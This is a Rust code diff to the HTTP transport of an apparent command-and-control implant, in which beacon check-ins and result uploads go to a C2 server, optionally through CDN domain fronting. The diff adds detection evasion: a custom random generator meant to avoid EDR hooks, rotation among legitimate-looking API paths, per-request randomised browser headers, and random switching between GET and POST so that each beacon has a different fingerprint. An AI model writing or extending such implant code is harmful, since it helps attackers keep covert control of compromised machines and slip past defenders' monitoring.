@@ -146,6 +146,106 @@ impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
     }
 }
 
+/// Simple LCG (Linear Congruential Generator) seeded from the current
+/// tick count.  Avoids calling into the full `rand` crate at every request,
+/// reducing the library surface visible to EDR hooks on `rand` internals.
+struct QuickRng {
+    state: u64,
+}
+
+impl QuickRng {
+    fn new() -> Self {
+        // Seed from a coarse monotonic timer; good enough for URI/header
+        // rotation where cryptographic quality is not required.
+        let seed = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_nanos() as u64;
+        Self { state: seed }
+    }
+
+    /// Return a pseudo-random `u64`.
+    fn next_u64(&mut self) -> u64 {
+        // Numerical Recipes LCG constants (64-bit)
+        self.state = self.state.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
+        self.state
+    }
+
+    /// Return a pseudo-random `usize` in `[0, exclusive_upper)`.
+    fn next_index(&mut self, exclusive_upper: usize) -> usize {
+        (self.next_u64() as usize) % exclusive_upper
+    }
+}
+
+// ── URI rotation pool ─────────────────────────────────────────────────────────
+//
+// Legitimate-looking API paths that blend with typical web application traffic.
+// Indexed via `QuickRng` at each check-in.
+
+const URI_POOL: &[&str] = &[
+    "/api/v1/status",
+    "/api/v2/health",
+    "/healthz",
+    "/v2/metrics",
+    "/graphql",
+    "/rest/alerts",
+    "/api/v1/users/me",
+    "/api/v1/notifications",
+    "/v1/analytics/events",
+    "/api/v2/tokens/refresh",
+    "/oauth/token",
+    "/.well-known/openid-configuration",
+    "/api/ping",
+    "/svc/update",
+    "/api/v2/search",
+];
+
+// ── Header randomization pools ────────────────────────────────────────────────
+
+const USER_AGENT_POOL: &[&str] = &[
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
+];
+
+const ACCEPT_POOL: &[&str] = &[
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "application/json, text/plain, */*",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "application/json",
+    "*/*",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+];
+
+const ACCEPT_LANGUAGE_POOL: &[&str] = &[
+    "en-US,en;q=0.9",
+    "en-US,en;q=0.8",
+    "en-US,en;q=0.5",
+    "en-GB,en;q=0.9,en-US;q=0.8",
+    "en,en-US;q=0.9",
+    "en-US",
+];
+
+/// Percent-encode a string for use in a URI query parameter.
+/// Encodes everything except unreserved characters (A-Z a-z 0-9 - _ . ~).
+fn percent_encode(input: &str) -> String {
+    let mut out = String::with_capacity(input.len());
+    for byte in input.bytes() {
+        match byte {
+            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
+                out.push(byte as char);
+            }
+            _ => {
+                out.push_str(&format!("%{:02X}", byte));
+            }
+        }
+    }
+    out
+}
+
 pub struct HttpTransport {
     profile: MalleableProfile,
     client: reqwest::Client,
@@ -164,12 +264,9 @@ impl HttpTransport {
         if !profile.kill_date.is_empty() {
             check_kill_date(&profile.kill_date)?;
         }
-        // Malleable profile headers
+        // Default headers: Host header is static (required for CDN fronting)
+        // but User-Agent is now randomised per-request via apply_random_headers().
         let mut headers = reqwest::header::HeaderMap::new();
-        headers.insert(
-            reqwest::header::USER_AGENT,
-            reqwest::header::HeaderValue::from_str(&profile.user_agent)?,
-        );
         if !profile.host_header.is_empty() {
             headers.insert(
                 reqwest::header::HOST,
@@ -203,6 +300,50 @@ impl HttpTransport {
             session,
             agent_id,
         })
+    }
+
+    /// Apply a randomly-selected User-Agent, Accept, and Accept-Language
+    /// header to the request builder.  Called once per outbound request so
+    /// that each check-in has a different fingerprint.
+    fn apply_random_headers(
+        &self,
+        req: reqwest::RequestBuilder,
+    ) -> reqwest::RequestBuilder {
+        let mut rng = QuickRng::new();
+
+        let ua = USER_AGENT_POOL[rng.next_index(USER_AGENT_POOL.len())];
+        let accept = ACCEPT_POOL[rng.next_index(ACCEPT_POOL.len())];
+        let lang = ACCEPT_LANGUAGE_POOL[rng.next_index(ACCEPT_LANGUAGE_POOL.len())];
+
+        req.header("User-Agent", ua)
+            .header("Accept", accept)
+            .header("Accept-Language", lang)
+    }
+
+    /// Pick a random URI from the rotation pool.
+    fn pick_uri(&self) -> &'static str {
+        let mut rng = QuickRng::new();
+        URI_POOL[rng.next_index(URI_POOL.len())]
+    }
+
+    /// Resolve the base endpoint URL (CDN fronting vs direct C2).
+    fn resolve_endpoint(&self) -> Result<String> {
+        if self.profile.cdn_relay {
+            if self.profile.cdn_endpoint.is_empty() {
+                anyhow::bail!(
+                    "cdn_relay is enabled but cdn_endpoint is not set; \
+                     configure the CDN relay address in the malleable profile"
+                );
+            }
+            Ok(format!("https://{}", self.profile.cdn_endpoint))
+        } else {
+            if self.profile.direct_c2_endpoint.is_empty() {
+                anyhow::bail!(
+                    "direct_c2_endpoint is not configured; set it in the malleable profile for non-CDN deployments"
+                );
+            }
+            Ok(self.profile.direct_c2_endpoint.clone())
+        }
     }
 
     async fn connect_with_retry(
@@ -250,38 +391,21 @@ impl HttpTransport {
 #[async_trait]
 impl Transport for HttpTransport {
     async fn send(&mut self, msg: Message) -> Result<()> {
-        log::debug!(
-            "Malleable HTTP C2 Send with profile User-Agent: {}",
-            self.profile.user_agent
-        );
+        log::debug!("Malleable HTTP C2 Send (result delivery)");
 
-        let endpoint = if self.profile.cdn_relay {
-            // Domain fronting: TCP connection goes to the CDN endpoint,
-            // while the Host HTTP header carries the C2 domain (set in new()).
-            if self.profile.cdn_endpoint.is_empty() {
-                anyhow::bail!(
-                    "cdn_relay is enabled but cdn_endpoint is not set; \
-                     configure the CDN relay address in the malleable profile"
-                );
-            }
-            format!("https://{}", self.profile.cdn_endpoint)
-        } else {
-            // Direct C2: operator must configure direct_c2_endpoint.
-            if self.profile.direct_c2_endpoint.is_empty() {
-                anyhow::bail!("direct_c2_endpoint is not configured; set it in the malleable profile for non-CDN deployments");
-            }
-            self.profile.direct_c2_endpoint.clone()
-        };
+        let endpoint = self.resolve_endpoint()?;
+        let uri = self.pick_uri();
 
         // Serialize and encrypt payload
         let serialized = bincode::serialize(&msg)?;
         let ciphertext = self.session.encrypt(&serialized);
 
-        // POST request
-        let req = self
-            .client
-            .post(format!("{}{}", endpoint, self.profile.uri))
-            .body(ciphertext);
+        // POST with randomised headers and URI
+        let req = self.apply_random_headers(
+            self.client
+                .post(format!("{}{}", endpoint, uri))
+                .body(ciphertext),
+        );
         let resp = self.connect_with_retry(req).await?;
         if !resp.status().is_success() {
             anyhow::bail!("C2 POST returned HTTP {}", resp.status());
@@ -291,26 +415,35 @@ impl Transport for HttpTransport {
     }
 
     async fn recv(&mut self) -> Result<Message> {
-        log::debug!("Malleable HTTP C2 Recv polling via GET");
+        log::debug!("Malleable HTTP C2 Recv (task fetch)");
 
-        let endpoint = if self.profile.cdn_relay {
-            // Domain fronting: TCP connection goes to the CDN endpoint,
-            // while the Host HTTP header carries the C2 domain (set in new()).
-            if self.profile.cdn_endpoint.is_empty() {
-                anyhow::bail!(
-                    "cdn_relay is enabled but cdn_endpoint is not set; \
-                     configure the CDN relay address in the malleable profile"
-                );
-            }
-            format!("https://{}", self.profile.cdn_endpoint)
+        let endpoint = self.resolve_endpoint()?;
+        let uri = self.pick_uri();
+
+        // Randomly alternate between GET and POST for the beacon request.
+        // If POST, the agent_id is placed in the request body as a simple
+        // identifier so the server can route the check-in; the server must
+        // accept both verbs for the check-in endpoint.
+        let use_post = QuickRng::new().next_u64() & 1 == 1;
+
+        let req = if use_post {
+            let body = format!("agent_id={}", self.agent_id);
+            self.apply_random_headers(
+                self.client
+                    .post(format!("{}{}", endpoint, uri))
+                    .body(body),
+            )
         } else {
-            if self.profile.direct_c2_endpoint.is_empty() {
-                anyhow::bail!("direct_c2_endpoint is not configured; set it in the malleable profile for non-CDN deployments");
-            }
-            self.profile.direct_c2_endpoint.clone()
+            // GET: metadata stays in query parameters
+            let url = format!(
+                "{}{}?id={}",
+                endpoint,
+                uri,
+                percent_encode(&self.agent_id),
+            );
+            self.apply_random_headers(self.client.get(&url))
         };
 
-        let req = self.client.get(format!("{}{}", endpoint, self.profile.uri));
         let resp = self.connect_with_retry(req).await?;
         let bytes = resp.bytes().await?;
 
